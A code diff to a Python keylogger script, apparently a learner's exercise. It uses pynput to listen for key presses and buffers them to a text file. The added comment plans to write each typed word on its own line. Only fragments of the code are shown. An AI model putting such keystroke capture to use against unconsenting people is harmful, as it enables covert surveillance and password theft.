@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# CREATING A KEY LOGGER
+# CREATING A KEY LOGGER (hacking) environment
 import pynput
 from pynput.keyboard import Key, Listener
 
@@ -20,6 +20,13 @@ def on_press(key):
         count = 0
         write_file(keys)
         keys = []
+
+# With the way the script is written write now, it is very
+# un readable in the text file. I need to make it to where
+# each line in the txt file is a word. and to do that I need
+# to make it so that every time someone hits the space bar
+# it saves those key presses to that line and then goes to
+# the next line.
 
 
 def write_file(keys):
